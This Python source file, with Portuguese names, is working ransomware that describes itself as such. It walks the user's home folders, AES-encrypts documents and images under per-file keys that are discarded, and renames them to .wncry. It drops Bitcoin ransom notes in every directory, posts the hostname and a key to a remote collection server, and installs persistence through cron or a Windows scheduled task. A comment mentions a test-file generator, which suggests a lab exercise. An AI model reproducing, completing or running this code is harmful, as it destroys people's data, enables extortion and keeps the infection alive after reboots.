import os
import sys
import base64
import json
import secrets
import socket
import argparse
import platform
import shutil
import subprocess
import requests
from pathlib import Path
from typing import List, Optional
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from requests.exceptions import RequestException

def enumerar_arquivos_alvo() -> List[str]:
    home = Path.home()

    # Nomes em EN e PT-BR + pasta de teste gerada pelo generate_test_files.py
    candidatos = [
        # Inglês (padrão Ubuntu/Debian fresh install)
        "Documents", "Desktop", "Downloads", "Pictures",
        # Português (Linux com locale pt_BR)
        "Documentos", "Área de Trabalho", "Imagens", "Fotos",
        # Pasta de teste criada pelo generate_test_files.py
        "Documentos_Teste",
    ]

    extensoes = {".xlsx", ".docx", ".pdf", ".txt", ".csv", ".jpg", ".png"}
    resultados: List[str] = []

    pastas_encontradas = []
    for nome_pasta in candidatos:
        caminho = home / nome_pasta
        if caminho.is_dir():
            pastas_encontradas.append(caminho)

    for caminho in pastas_encontradas:
        for raiz, _, arquivos in os.walk(caminho, followlinks=False):
            for nome in arquivos:
                try:
                    caminho_arquivo = Path(raiz) / nome
                    if caminho_arquivo.suffix.lower() in extensoes:
                        resultados.append(str(caminho_arquivo.resolve()))
                except (PermissionError, OSError):
                    continue

    return resultados

def criptografar_arquivo(caminho_arquivo: str):
    try:
        caminho = Path(caminho_arquivo).resolve()
        if not caminho.is_file():
            raise FileNotFoundError(f"Arquivo não encontrado: {caminho}")
        chave = get_random_bytes(32)
        nonce = get_random_bytes(12)
        with caminho.open('rb') as f:
            dados_claros = f.read()
        cipher = AES.new(chave, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(dados_claros)
        payload = nonce + tag + ciphertext
        caminho_tmp = caminho.with_suffix('.tmp')
        with caminho_tmp.open('wb') as f:
            f.write(payload)
            f.flush()
            os.fsync(f.fileno())
        caminho_tmp.replace(caminho.with_suffix('.wncry'))
        return base64.b64encode(chave).decode(), base64.b64encode(nonce).decode()
    except Exception as e:
        raise RuntimeError(f"Falha ao criptografar o arquivo '{caminho_arquivo}': {e}") from e

def gerar_notas_resgate(base_path: str = "."):
    mensagem = (
        "=== SEU ARQUIVO FOI ENCONTRADO! ===\\n"
        "Nós temos controle sobre os seus dados. Para liberar o acesso, "
        "realize o pagamento de 0.01 BTC para o endereço abaixo:\\n\\n"
        "    1A2b3C4d5E6f7G8h9I0jK1L2mN3oP4qR5s\\n\\n"
        "Após a confirmação, entre em contato com ransom@example.com.\\n"
        "Não tente remover este arquivo sem antes atender às exigências."
    )
    base = Path(base_path).resolve()
    if not base.is_dir():
        print(f"Erro: caminho base '{base}' não é um diretório válido.", file=sys.stderr)
        return
    for root, _, _ in os.walk(base):
        leiam_path = Path(root) / "LEIA_ME.txt"
        if leiam_path.exists():
            print(f"Arquivo já existente, pulando: {leiam_path}")
            continue
        try:
            with leiam_path.open("w", encoding="utf-8") as f:
                f.write(mensagem)
            print(f"Arquivo criado: {leiam_path}")
        except PermissionError:
            print(f"Permissão negada ao tentar escrever em: {leiam_path}", file=sys.stderr)
        except OSError as e:
            print(f"Erro ao criar {leiam_path}: {e}", file=sys.stderr)

def enviar_chave(url: str = "http://10.254.19.191:8080/collect") -> bool:
    try:
        hostname: str = socket.gethostname()
        aes_key_bytes: bytes = os.urandom(32)
        aes_key_b64: str = base64.b64encode(aes_key_bytes).decode("utf-8")
        payload: dict = {"hostname": hostname, "aes_key": aes_key_b64}
        headers: dict = {"Content-Type": "application/json"}
        response: requests.Response = requests.post(
            url, data=json.dumps(payload), headers=headers, timeout=10
        )
        return 200 <= response.status_code < 300
    except (RequestException, OSError):
        return False

def configurar_persistencia(script_path: str) -> str:
    try:
        script_path = Path(script_path).resolve()
        if not script_path.is_file():
            return f"Erro: o caminho especificado não existe ou não é um arquivo: {script_path}"
        system = platform.system()
        if system == "Linux":
            cron_line = f"@reboot {shutil.which('python3') or sys.executable} {script_path} >/dev/null 2>&1"
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current_crontab = "" if result.returncode != 0 else result.stdout
            if cron_line in current_crontab:
                return "Persistência já configurada no cron."
            new_crontab = current_crontab + ("\n" if current_crontab and not current_crontab.endswith("\n") else "") + cron_line + "\n"
            proc = subprocess.run(["crontab", "-"], input=new_crontab, text=True, capture_output=True)
            if proc.returncode != 0:
                return f"Erro ao instalar crontab: {proc.stderr.strip()}"
            return "Persistência configurada com sucesso via cron."
        elif system == "Windows":
            task_name = f"Persistencia_{Path(script_path).stem}"
            python_exe = sys.executable.replace("/", "\\")
            cmd = f'"{python_exe}" "{script_path}"'
            check = subprocess.run(["schtasks", "/Query", "/TN", task_name],
                                   capture_output=True, text=True)
            if check.returncode == 0:
                return f"Tarefa '{task_name}' já existe no agendador."
            create_cmd = [
                "schtasks", "/Create",
                "/TN", task_name,
                "/TR", cmd,
                "/SC", "ONSTART",
                "/RL", "HIGHEST",
                "/F"
            ]
            proc = subprocess.run(create_cmd, capture_output=True, text=True)
            if proc.returncode != 0:
                return f"Erro ao criar tarefa agendada: {proc.stderr.strip()}"
            return f"Tarefa '{task_name}' criada com sucesso no agendador."
        else:
            return f"Sistema operacional não suportado: {system}"
    except Exception as e:
        return f"Exceção inesperada: {e}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Executa o fluxo completo de ransomware.")
    parser.add_argument(
        "--no-encrypt",
        action="store_true",
        help="Pula a etapa de criptografia dos arquivos encontrados."
    )
    parser.add_argument(
        "--no-notes",
        action="store_true",
        help="Pula a geração de notas de resgate."
    )
    parser.add_argument(
        "--no-sendkey",
        action="store_true",
        help="Pula o envio da chave ao servidor."
    )
    parser.add_argument(
        "--no-persist",
        action="store_true",
        help="Pula a configuração de persistência."
    )
    args = parser.parse_args()

    print("[*] Enumerando arquivos alvo...")
    arquivos = enumerar_arquivos_alvo()
    print(f"Arquivos encontrados: {len(arquivos)}")

    if not args.no_encrypt:
        print("[*] Criptografando arquivos...")
        for arquivo in arquivos:
            try:
                chave_b64, nonce_b64 = criptografar_arquivo(arquivo)
                # Opcional: armazenar/chave para uso futuro
            except Exception as e:
                print(f"Erro ao criptografar {arquivo}: {e}", file=sys.stderr)

    if not args.no_notes:
        print("[*] Gerando notas de resgate...")
        gerar_notas_resgate()

    if not args.no_sendkey:
        print("[*] Enviando chave ao servidor...")
        sucesso = enviar_chave()
        print(f"Envio bem-sucedido: {sucesso}")

    if not args.no_persist:
        print("[*] Configurando persistência...")
        mensagem = configurar_persistencia(__file__)
        print(mensagem)